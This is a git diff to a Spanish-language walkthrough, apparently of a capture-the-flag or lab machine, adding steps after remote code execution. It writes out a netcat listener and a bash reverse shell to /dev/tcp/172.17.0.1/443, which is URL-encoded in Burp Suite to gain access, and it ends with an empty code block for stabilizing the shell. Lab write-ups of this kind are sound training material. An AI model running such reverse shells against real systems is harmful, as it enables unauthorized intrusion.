@@ -45,4 +45,20 @@ Esto nos generará un código gigante el cual tendremos que poner en el parámet
 Por lo que ya pudimos realizar un **RCE**
 
 ## Paso N5: Generando reverse shell
+Una vez podamos ejecutar código tenemos que ejecutar una reverse shell escuchando en el puerto 443 `nc -lvnp 443` con:
+```
+bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'
+```
+Pero de primeras no nos dejará, tenemos que codearlo a url, por lo que si dejamos el texto remarcado y se presiona Ctrl+U en burpsuite se codeará automáticamente y habremos logrado acceder al sistema.
+<img width="1036" height="413" alt="image" src="https://github.com/user-attachments/assets/eef5be4f-cd29-49f2-956c-812bbff84b56" />
+<img width="677" height="158" alt="image" src="https://github.com/user-attachments/assets/81958457-3cf7-4716-a720-b26cc4fee90c" />
+
+## Paso N6: Accediendo a usuarios
+Empezaremos estabilizando la shell con
+```
+
+
+```
+
+
 
